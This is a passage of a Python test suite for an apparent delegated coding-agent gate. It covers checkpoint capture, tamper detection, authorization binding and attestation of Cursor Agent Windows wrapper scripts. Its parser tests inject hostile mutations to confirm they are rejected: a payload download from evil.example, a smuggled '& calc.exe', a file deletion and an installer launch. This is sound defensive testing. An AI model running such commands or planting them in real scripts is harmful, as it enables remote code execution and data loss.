    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=_mutate_without_feature)); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED; request=h.store.load_request(h.session_id,"native-canary-gate",0); evidence=load_behavioral_verifier(request=request,execution_store=h.store); assert evidence.exit_code != 0
    assert EXPECTED_MATERIAL_PATHS.issubset(set(h.store.load_result(h.session_id,"native-canary-gate",0).changed_material_files))


def test_genuine_implementation_passes_behavioral_verifier_and_reconstructs_disk_evidence(tmp_path: Path):
    h=_harness(tmp_path); first=h.coordinator.run(session_id=h.session_id); assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    second=h.coordinator.run(session_id=h.session_id); assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and second.provider_invocations==0 and len(h.runner.invocations)==1
    request=h.store.load_request(h.session_id,"native-canary-gate",0); assert run_behavioral_verifier(request=request,execution_store=h.store).exit_code==0


def test_capture_failure_is_terminal_and_repeated_call_never_retries(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",lambda **_: (_ for _ in ()).throw(RuntimeError("capture boom")))
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and second.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and len(h.runner.invocations)==1


def _materialize_success_with_failing_checkpoint_command(repository: Path) -> None:
    _materialize_success(repository)
    package=json.loads((repository/"package.json").read_text(encoding="utf-8"))
    package["scripts"]["test"]="node --input-type=module -e \"process.exit(7)\""
    (repository/"package.json").write_text(json.dumps(package),encoding="utf-8",newline="\n")
    env=dict(os.environ); env.update({"GIT_AUTHOR_NAME":"Deterministic Fake Executor","GIT_AUTHOR_EMAIL":"fake@invalid.example","GIT_COMMITTER_NAME":"Deterministic Fake Executor","GIT_COMMITTER_EMAIL":"fake@invalid.example","GIT_AUTHOR_DATE":"2026-01-02T00:00:00Z","GIT_COMMITTER_DATE":"2026-01-02T00:00:00Z"})
    _command(["git","add","package.json"],cwd=repository); _command(["git","commit","--quiet","--amend","--no-edit"],cwd=repository,env=env)


def test_failed_checkpoint_command_is_terminal_and_never_persists_success(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=_materialize_success_with_failing_checkpoint_command)); count={"value":0}
    from admissible.delegated_gate.checkpoint import capture_checkpoint as production_capture_checkpoint
    def counted_capture(**kwargs: object) -> object:
        count["value"]+=1
        return production_capture_checkpoint(**kwargs)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",counted_capture)
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    state=h.session_store.load(h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and second.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED
    assert state.phase is Phase.GATE_EXECUTING and state.checkpoint_history==() and count["value"]==1


def test_started_capture_record_is_ambiguous_and_never_replayed(tmp_path: Path):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id); started=__import__("admissible.delegated_gate.reducer",fromlist=["reduce"]).reduce(state,__import__("admissible.delegated_gate.events",fromlist=["GateExecutionStarted"]).GateExecutionStarted(state.current_gate.gate_id)); h.session_store.replace(started,expected_revision=state.revision)
    request,prompt=_request(h); h.store.create_request(request); issued=h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory); result=h.store.write_result(issued); behavioral=run_behavioral_verifier(request=request,execution_store=h.store)
    h.store.create_capture_attempt(request=request,result=result,gate_plan_fingerprint=state.gate_plan.plan_fingerprint,checkpoint_contract_fingerprint=state.current_gate.contract_fingerprint,behavioral_evidence_fingerprint=behavioral.evidence_fingerprint,required_command_ids=tuple(command.command_id for command in state.current_gate.checkpoint_verification_commands),state_revision=state.revision)
    outcome=h.coordinator.run(session_id=h.session_id); assert outcome.status is NativeCanaryStatus.CAPTURE_ATTEMPT_AMBIGUOUS and len(h.runner.invocations)==1


def test_checkpoint_artifact_tamper_blocks_final_reconstruction(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success; state=h.session_store.load(h.session_id); ref=state.checkpoint_history[-1].artifact_references[0]; path=h.evidence/"checkpoint-artifacts"/ref.relative_path; path.write_bytes(path.read_bytes()+b"tamper")
    with pytest.raises(NativeEvidenceInvalid,match="checkpoint artifact hash"):
        h.coordinator.run(session_id=h.session_id)


@pytest.mark.parametrize(("field", "value"), [
    ("checkpoint_contract_fingerprint", "0" * 64),
    ("gate_id", "substituted-gate"),
    ("request_fingerprint", "1" * 64),
    ("result_fingerprint", "2" * 64),
    ("behavioral_evidence_fingerprint", "3" * 64),
    ("capture_attempt_id", "capture:other-session:other-gate:0"),
    ("expected_terminal_status", "CAPTURE_FAILED"),
])
def test_reconstruction_binds_every_capture_attempt_authority_field(tmp_path: Path, field: str, value: str):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    path=h.store._path("capture-attempt",h.session_id,"native-canary-gate",0); original=path.read_bytes(); raw=json.loads(original)
    raw[field]=value; raw["attempt_fingerprint"]=fingerprint({key:item for key,item in raw.items() if key!="attempt_fingerprint"}); path.write_bytes(__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(raw)+b"\n")
    with pytest.raises(NativeEvidenceInvalid): h.coordinator.run(session_id=h.session_id)


def test_duplicate_capture_attempt_record_blocks_final_reconstruction(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    original=h.store._path("capture-attempt",h.session_id,"native-canary-gate",0)
    duplicate=h.store.directory/f"{h.session_id}.native-canary-gate.attempt-99.native-capture-attempt.json"; duplicate.write_bytes(original.read_bytes())
    with pytest.raises(NativeEvidenceInvalid,match="alternate or duplicate"):
        h.coordinator.run(session_id=h.session_id)


def test_authorization_payload_binds_backend_head_model_timeout_and_run_id(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path); payload=build_authorization_payload(source_repository=h.source,source_head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip(),run_id="run-one",session_id=h.session_id,attestation=h.attestation,run_root=tmp_path/"future-run",timeout_seconds=30)
    phrase="owner phrase"; digest=hashlib.sha256(phrase.encode()+b"\0"+__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(payload.to_dict())).hexdigest(); monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256",digest)
    from admissible.delegated_gate.native_canary import _authorized
    assert _authorized(phrase,payload,active_source_repository=h.source) and not _authorized("wrong",payload,active_source_repository=h.source)
    changed=payload.to_dict(); changed["run_id"]="run-two"; changed["payload_fingerprint"]=fingerprint({key:value for key,value in changed.items() if key!="payload_fingerprint"})
    from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
    assert not _authorized(phrase,NativeCanaryAuthorizationPayload.from_dict(changed),active_source_repository=h.source)
    for field,value in (("source_head","f"*40),("backend_attestation_fingerprint","0"*64),("selected_model","other-model"),("timeout_seconds",31)):
        changed=payload.to_dict(); changed[field]=value; changed["payload_fingerprint"]=fingerprint({key:value for key,value in changed.items() if key!="payload_fingerprint"})
        altered=NativeCanaryAuthorizationPayload.from_dict(changed)
        assert not _authorized(phrase,altered,active_source_repository=h.source)


def test_preflight_only_is_effect_free_and_existing_run_id_is_rejected(tmp_path: Path,monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h=_harness(tmp_path); head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip(); preflight_root=tmp_path/"preflight-run"
    common=["--source-repository",str(h.source),"--required-source-head",head,"--run-root",str(preflight_root),"--run-id","preflight-run","--session-id",h.session_id,"--executable",h.config.executable,"--executable-prefix-arg",h.config.launcher_prefix[0],"--timeout-seconds","30"]
    # An injected test attestation is not production provenance.  The real CLI
    # therefore blocks before creating a run root or invoking any provider.
    assert main([*common,"--preflight-only"])==2 and not preflight_root.exists() and h.runner.invocations==[]
    captured=json.loads(capsys.readouterr().out)
    assert captured["status"]==NativePreflightStatus.PREFLIGHT_BLOCKED.value


# --- Act 2A.2: LOCAL_WRAPPER_CHAIN attestation ------------------------------

from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
from admissible.delegated_gate.native_executor import (
    ATTESTATION_CLASS_PACKAGE_BIN,
    ATTESTATION_CLASS_WRAPPER_CHAIN,
    WRAPPER_CHAIN_CLAIMS,
    WRAPPER_CHAIN_NON_CLAIMS,
    WRAPPER_CHAIN_READY_REASON,
    WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION,
    WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION_LEGACY_V1,
    PowerShellCommandObservation,
    WhereCommandObservation,
    WindowsWhereDiagnosticStatus,
    WrapperChainBackendAttestation,
    attestation_from_dict,
    preflight_native_cursor as _preflight,
    _attest_local_backend,
    _attest_wrapper_chain_cursor,
    _attest_wrapper_chain_cursor_observed,
    _deterministic_windows_resolve,
    _parse_cmd_wrapper,
    _parse_powershell_wrapper,
    _POWERSHELL_WRAPPER_TEMPLATE_LINES,
    _safe_directory,
    _same_file_authority,
    _same_directory_identity,
    _same_mutable_directory_entry,
)

_OBSERVED_CMD_WRAPPER = (
    '@echo off\r\n'
    'setlocal enabledelayedexpansion\r\n'
    'set "CURSOR_INVOKED_AS=%~nx0"\r\n'
    '\r\n'
    'REM Get the directory of this script\r\n'
    'set "SCRIPT_DIR=%~dp0"\r\n'
    'REM Remove trailing backslash\r\n'
    'if "%SCRIPT_DIR:~-1%"=="\\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"\r\n'
    '\r\n'
    '%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%\\cursor-agent.ps1" %*\r\n'
)
_OBSERVED_PS_WRAPPER = "## Locally observed Anysphere launcher\r\n" + "\r\n".join(_POWERSHELL_WRAPPER_TEMPLATE_LINES) + "\r\n"


def _wrapper_chain_installation(tmp_path: Path, *, versions: tuple[str, ...] = ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0"), manifest_name: str = EXPECTED_CURSOR_PACKAGE_NAME) -> Path:
    root = tmp_path / "wrapper-install"; root.mkdir()
    (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    (root / "cursor-agent.ps1").write_bytes(_OBSERVED_PS_WRAPPER.encode("utf-8"))
    for name in versions:
        version = root / "versions" / name; version.mkdir(parents=True)
        shutil.copy2(Path(sys.executable).resolve(), version / "node.exe")
        (version / "index.js").write_text("// deterministic fake cursor entry\n", encoding="utf-8")
        (version / "package.json").write_text(json.dumps({"name": manifest_name}), encoding="utf-8")
        (version / "cursor-agent.cmd").write_bytes((root / "cursor-agent.cmd").read_bytes())
        (version / "cursor-agent.ps1").write_bytes((root / "cursor-agent.ps1").read_bytes())
    return root


@dataclass
class FakeWrapperChainDiscovery:
    """Explicit test-only discovery seam; unreachable from the production CLI."""

    root: Path
    which: str | None = None
    which_unavailable: bool = False
    where: tuple[str, ...] | None = None
    powershell: tuple[str, ...] | None = None
    powershell_records: tuple[tuple[str, str, str], ...] | None = None
    powershell_preferred: tuple[str, str, str] | None = None
    path: str | None = None
    pathext: str = ".COM;.EXE;.BAT;.CMD"
    where_exit_code: int = 0
    where_stdout: bytes | None = None
    where_stderr: bytes = b""
    where_unavailable: bool = False
    where_execution_error: bool = False

    def which_cursor_agent(self, *, path_value: str, pathext_value: str) -> str | None:
        if self.which_unavailable:
            return None
        return self.which if self.which is not None else str(self.root / "cursor-agent.cmd")

    def where_cursor_agent(self) -> WhereCommandObservation:
        if self.where_unavailable:
            return WhereCommandObservation(None, ("where.exe", "cursor-agent"), None, b"", b"")
        executable = str(Path(sys.executable).resolve())
        paths = self.where if self.where is not None else (str(self.root / "cursor-agent.cmd"),)
        stdout = self.where_stdout if self.where_stdout is not None else (
            "".join(f"{item}\r\n" for item in paths).encode("utf-8")
        )
        return WhereCommandObservation(
            executable, (executable, "cursor-agent"),
            None if self.where_execution_error else self.where_exit_code,
            stdout, self.where_stderr, self.where_execution_error,
        )

    def powershell_cursor_agent(self) -> PowerShellCommandObservation | None:
        if self.powershell_records is not None:
            rows = self.powershell_records
        else:
            paths = self.powershell if self.powershell is not None else (
                str(self.root / "cursor-agent.ps1"), str(self.root / "cursor-agent.cmd"),
            )
            rows = tuple(
                ("ExternalScript" if Path(item).suffix.casefold() == ".ps1" else "Application", Path(item).name, item)
                for item in paths
            )
        preferred = self.powershell_preferred
        if preferred is None:
            preferred = next((item for item in rows if Path(item[2]).suffix.casefold() == ".ps1"), rows[0] if rows else None)
        return PowerShellCommandObservation(rows, preferred)

    def path_value(self) -> str: return self.path if self.path is not None else str(self.root) + ";" + "C:\\Windows"
    def pathext_value(self) -> str: return self.pathext
    def node_signature_context(self, node_path: Path) -> str: return "NotSigned|test-context"


_WRAPPER_CONFIG = CursorNativeBackendConfig(executable="cursor-agent", attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)


def _wrapper_attestation(tmp_path: Path) -> tuple[Path, FakeWrapperChainDiscovery, WrapperChainBackendAttestation]:
    root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(root)
    return root, discovery, _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)


def test_wrapper_chain_positive_recognizes_observed_grammar_and_selects_latest(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    assert attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert attestation.version_inventory == ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0")
    assert attestation.selected_version == "2026.07.09-a3815c0"
    selected = root / "versions" / "2026.07.09-a3815c0"
    assert Path(attestation.executable.canonical_path) == selected / "node.exe"
    assert Path(attestation.launcher_prefix[0].canonical_path) == selected / "index.js"
    assert attestation.cmd_semantics["adjacent_powershell_target"] == "cursor-agent.ps1"
    assert attestation.powershell_semantics["executes"] == "selected-version node.exe index.js"
    assert dict(attestation.claims) == WRAPPER_CHAIN_CLAIMS and attestation.claims["publisher_provenance_established"] is False
    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
    assert attestation.manifest_declares_cursor_agent_bin is False
    reloaded = attestation_from_dict(json.loads(json.dumps(attestation.to_dict())))
    assert isinstance(reloaded, WrapperChainBackendAttestation) and reloaded == attestation
    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery) == attestation


def test_wrapper_chain_requires_explicit_class_and_rejects_caller_supplied_roots(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="explicitly configured"):
        _attest_wrapper_chain_cursor(CursorNativeBackendConfig(executable="cursor-agent"), discovery=FakeWrapperChainDiscovery(root))
    with pytest.raises(ValueError, match="bare canonical"):
        CursorNativeBackendConfig(executable=str(root / "cursor-agent.cmd"), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
    with pytest.raises(ValueError, match="bare canonical"):
        CursorNativeBackendConfig(executable="cursor-agent", launcher_prefix=(str(root / "cursor-agent.ps1"),), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
    # A failed package-bin attestation raises; it never downgrades in place.
    with pytest.raises(ValueError):
        _attest_local_backend(CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()), launcher_prefix=(str(root / "cursor-agent.ps1"),)))


def test_production_wrapper_chain_surface_has_no_injection_seam():
    import inspect
    from admissible.delegated_gate.native_canary import build_parser as production_parser
    assert set(inspect.signature(_preflight).parameters) == {"config", "work_workspace"}
    options = {option for action in production_parser()._actions for option in action.option_strings}
    assert not any("discovery" in option or "attestation-file" in option for option in options)


@pytest.mark.parametrize("mutate", [
    lambda text: text + "del /q important.txt\r\n",
    lambda text: text.replace("cursor-agent.ps1", "other.ps1"),
    lambda text: text.replace(" %*", " %* --force"),
    lambda text: text.replace("%*\r\n", "%* & calc.exe\r\n"),
    lambda text: text.replace('"%SCRIPT_DIR%\\cursor-agent.ps1"', '"C:\\Temp\\cursor-agent.ps1"'),
    lambda text: text.replace("-NoProfile ", ""),
    lambda text: text.replace('set "SCRIPT_DIR=%~dp0"', 'cd /d C:\\ \r\nset "SCRIPT_DIR=%~dp0"'),
])
def test_cmd_wrapper_parser_rejects_non_audited_semantics(mutate):
    with pytest.raises(ValueError):
        _parse_cmd_wrapper(mutate(_OBSERVED_CMD_WRAPPER).encode("ascii"), wrapper_name="cursor-agent.cmd")


@pytest.mark.parametrize("mutate", [
    lambda text: text + "Invoke-WebRequest https://evil.example/payload -OutFile $scriptPath\\update.ps1\r\n",
    lambda text: text.replace("$args\r\n", "$args --force\r\n"),
    lambda text: text.replace('"$scriptPath\\versions"', '"$env:TEMP\\versions"'),
    lambda text: text.replace("'^\\d{4}", "'^\\d{2}"),
    lambda text: text.replace("Select-Object -First 1", "Select-Object -Last 1"),
    lambda text: text + '@"\r\nhidden\r\n"@\r\n',
    lambda text: text.replace("exit $LASTEXITCODE\r\n", "exit $LASTEXITCODE\r\nStart-Process installer.exe\r\n"),
])
def test_powershell_wrapper_recognizer_fails_closed(mutate):
    with pytest.raises(ValueError):
        _parse_powershell_wrapper(mutate(_OBSERVED_PS_WRAPPER).encode("utf-8"))


def test_contradictory_or_out_of_root_command_resolution_blocks(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    (elsewhere / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    base = FakeWrapperChainDiscovery(root)
    for discovery in (
        FakeWrapperChainDiscovery(root, which=str(elsewhere / "cursor-agent.cmd")),
        FakeWrapperChainDiscovery(root, where=(str(elsewhere / "cursor-agent.cmd"), str(root / "cursor-agent.cmd"))),
        FakeWrapperChainDiscovery(root, where=(str(root / "cursor-agent.cmd"), str(elsewhere / "cursor-agent.cmd"))),
        FakeWrapperChainDiscovery(root, powershell=(str(elsewhere / "cursor-agent.cmd"),)),
        FakeWrapperChainDiscovery(root, path="C:\\Windows"),
        FakeWrapperChainDiscovery(root, pathext=".COM;.EXE;.BAT"),
        FakeWrapperChainDiscovery(root, which=""),
    ):
        with pytest.raises(ValueError):
            _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=base) is not None


def test_changed_path_fingerprint_produces_a_different_attestation(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    reordered = FakeWrapperChainDiscovery(root, path="C:\\Windows" + os.pathsep + str(root))
    other = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=reordered)
    assert other.attestation_fingerprint != attestation.attestation_fingerprint


def test_version_tie_ambiguity_and_grammar_mismatch_block(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path, versions=("2026.07.09-a3815c0", "2026.7.9-bbbbbbb"))
    with pytest.raises(ValueError, match="ambiguous"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))
    (tmp_path / "bad").mkdir()
    bad = _wrapper_chain_installation(tmp_path / "bad", versions=("not-a-version",))
    with pytest.raises(ValueError, match="grammar"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(bad))


def test_junction_or_symlink_version_directory_is_refused(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    target = tmp_path / "redirect-target"; target.mkdir()
    link = root / "versions" / "2026.08.01-cafecafe"
    if os.name == "nt":
        completed = subprocess.run(["cmd.exe", "/d", "/c", "mklink", "/J", str(link), str(target)], shell=False, capture_output=True)
        if completed.returncode != 0: pytest.skip("junction creation unavailable")
    else:
        try: os.symlink(target, link, target_is_directory=True)
        except (OSError, NotImplementedError): pytest.skip("symlinks unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))


@pytest.mark.parametrize("mutate", [
    lambda root, selected: (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.replace(" %*", " %* --trust").encode("ascii")),
    lambda root, selected: (root / "cursor-agent.ps1").write_bytes((_OBSERVED_PS_WRAPPER + "Copy-Item a b\r\n").encode("utf-8")),
    lambda root, selected: (selected / "cursor-agent.ps1").write_bytes(b"# hollowed\r\n" + (root / "cursor-agent.ps1").read_bytes()),
    lambda root, selected: (selected / "index.js").write_text("// substituted entry\n", encoding="utf-8"),
    lambda root, selected: (selected / "node.exe").write_bytes((selected / "node.exe").read_bytes() + b"x"),
    lambda root, selected: (selected / "package.json").write_text(json.dumps({"name": "impostor-package"}), encoding="utf-8"),
    lambda root, selected: (root / "versions" / "2026.08.01-cafecafe").mkdir(),
    lambda root, selected: shutil.copy2(selected / "node.exe", root / "node.exe"),
])
def test_any_authoritative_change_after_attestation_fails_revalidation_and_blocks_spawn(tmp_path: Path, mutate):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    selected = root / "versions" / attestation.selected_version
    mutate(root, selected)
    with pytest.raises(ValueError):
        attestation.validated()


def test_substituted_wrapper_chain_attestation_with_recomputed_fingerprints_is_rejected(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    raw = attestation.to_dict()
    raw["selected_version"] = "2026.06.15-18-00-12-6f5a2cf"
    raw["attestation_fingerprint"] = fingerprint({key: value for key, value in raw.items() if key != "attestation_fingerprint"})
    with pytest.raises(ValueError):
        attestation_from_dict(raw)
    lying = attestation.to_dict()
    lying["claims"] = {**lying["claims"], "publisher_provenance_established": True}
    lying["attestation_fingerprint"] = fingerprint({key: value for key, value in lying.items() if key != "attestation_fingerprint"})
    with pytest.raises(ValueError, match="claim"):
        attestation_from_dict(lying)


def _wrapper_chain_harness(tmp_path: Path) -> tuple[Harness, FakeWrapperChainDiscovery]:
    source_parent = tmp_path / "source-parent"; source_parent.mkdir(); source = build_canary_repository(source_parent, repository_name="source").repository
    root = tmp_path / "run"; root.mkdir(); work = build_canary_repository(root).repository; evidence = root / "evidence"; evidence.mkdir()
    install_root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(install_root)
    attestor = lambda config: _attest_wrapper_chain_cursor(config, discovery=discovery)
    attestation = attestor(_WRAPPER_CONFIG)
    fake = FakeNativeProcessRunner(); store = AtomicNativeExecutionStore(evidence / "native-execution", directory_sync=lambda _: None); session_store = AtomicDelegatedSessionStore(evidence / "delegated-state")
    session_id = "wrapper-chain-session"; session_store.create(create_canary_session(session_id=session_id))
    executor = NativeDelegatedExecutor(config=_WRAPPER_CONFIG, process_runner=fake, clock=Clock(), local_attestor=attestor)
    coordinator = NativeCanaryCoordinator(session_store=session_store, execution_store=store, executor=executor, backend_attestation=attestation, source_repository=source, work_workspace=work, canary_parent=root, evidence_directory=evidence, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
    return Harness(root, source, work, evidence, _WRAPPER_CONFIG, attestation, fake, store, session_store, executor, coordinator, session_id), discovery


def test_wrapper_chain_attestation_round_trips_through_request_execution_and_reconstruction(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    first = h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    second = h.coordinator.run(session_id=h.session_id)
    assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and len(h.runner.invocations) == 1
    request = h.store.load_request(h.session_id, "native-canary-gate", 0)
    assert isinstance(request.backend_attestation, WrapperChainBackendAttestation)
    assert request.backend_attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    argv = h.runner.invocations[0].argv
    assert argv[0] == h.attestation.executable.canonical_path and argv[1] == h.attestation.launcher_prefix[0].canonical_path


def test_new_later_version_after_authorization_blocks_spawn_and_invalidates_payload(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
    request = NativeExecutionRequest.create(session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0, mission_fingerprint=state.mission.mission_fingerprint, gate_contract_fingerprint=state.current_gate.contract_fingerprint, work_workspace=h.work, evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory, attestation=h.attestation, prompt=prompt, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
    assert payload.backend_attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert tuple(payload.attestation_non_claims) == WRAPPER_CHAIN_NON_CLAIMS
    install_root = Path(h.attestation.command_resolution.wrapper_root)
    later = install_root / "versions" / "2026.08.01-cafecafe"; later.mkdir()
    shutil.copy2(Path(sys.executable).resolve(), later / "node.exe")
    (later / "index.js").write_text("// newer entry\n", encoding="utf-8")
    (later / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME}), encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root, allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations == []
    fresh = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    new_payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=fresh, run_root=tmp_path / "future-run", timeout_seconds=30)
    assert new_payload.payload_fingerprint != payload.payload_fingerprint


def test_authorization_payload_rejects_mismatched_class_and_non_claims(tmp_path: Path):
    h, _ = _wrapper_chain_harness(tmp_path)
    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
    for field, value in (
        ("backend_attestation_class", ATTESTATION_CLASS_PACKAGE_BIN),
        ("backend_attestation_class", "CURSOR_INSTALLATION_PROVEN"),
        ("attestation_non_claims", []),
        ("attestation_non_claims", list(WRAPPER_CHAIN_NON_CLAIMS[:-1])),
    ):
        changed = payload.to_dict(); changed[field] = value
        changed["payload_fingerprint"] = fingerprint({key: item for key, item in changed.items() if key != "payload_fingerprint"})
        with pytest.raises(ValueError):
            NativeCanaryAuthorizationPayload.from_dict(changed)


def test_real_host_wrapper_chain_preflight_is_static_and_truthfully_non_overclaiming():
    if os.name != "nt" or shutil.which("cursor-agent") is None:
        pytest.skip("Cursor Agent is not locally installed")
    decision = _preflight(config=_WRAPPER_CONFIG)
    if decision.status is not NativePreflightStatus.PREFLIGHT_READY:
        pytest.skip(f"local wrapper chain does not currently attest: {decision.detail}")
    assert decision.reason_code == WRAPPER_CHAIN_READY_REASON
    attestation = decision.attestation
    assert isinstance(attestation, WrapperChainBackendAttestation)
    assert attestation.claims["publisher_provenance_established"] is False
    assert attestation.claims["cli_capability_behavior_proven"] is False
    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
    assert "CURSOR_INSTALLATION_PROVEN" not in decision.reason_code


def test_prompt_header_and_no_agent_os_import():
    package=Path(__file__).resolve().parents[1]/"admissible"/"delegated_gate"; source=(package/"native_executor.py").read_text(encoding="utf-8")+(package/"native_canary.py").read_text(encoding="utf-8")
    assert "agent_os" not in source and build_native_agent_prompt(mission=create_canary_session(session_id="s").mission,gate_contract=create_canary_session(session_id="s").current_gate,work_workspace=Path.cwd()).startswith("You are the Admissible native coding agent.")


# --- Act 2A.3A: complete v3 authorization payload ---------------------------

from admissible.delegated_gate.canonical import canonical_bytes as _canonical_bytes
from admissible.delegated_gate.native_canary import (
    AUTHORIZATION_SCHEMA_VERSION,
    AUTHORIZATION_SCHEMA_VERSION_LEGACY_V2,
    CANARY_NON_CLAIMS,
    CLASS_READINESS_REASONS,
    EVIDENCE_DIRECTORY_NAME,
    NATIVE_SIDECAR_DIRECTORY_NAME,
    PACKAGE_BIN_READY_REASON,
    WORKSPACE_DIRECTORY_NAME,
    _authorized,
)

_V3_RUN_ID = "native-cursor-canary-001"


def _v3_payload(tmp_path: Path, *, run_id: str = _V3_RUN_ID, run_root: Path | None = None):
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    source = tmp_path / "source-repo"; source.mkdir()
    run_root = run_root if run_root is not None else tmp_path / run_id
    payload = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id=run_id, session_id=run_id,
        attestation=attestation, run_root=run_root, timeout_seconds=900,
    )
    return source, run_root, attestation, payload


def _refingerprint(data: dict) -> dict:
    data = dict(data)
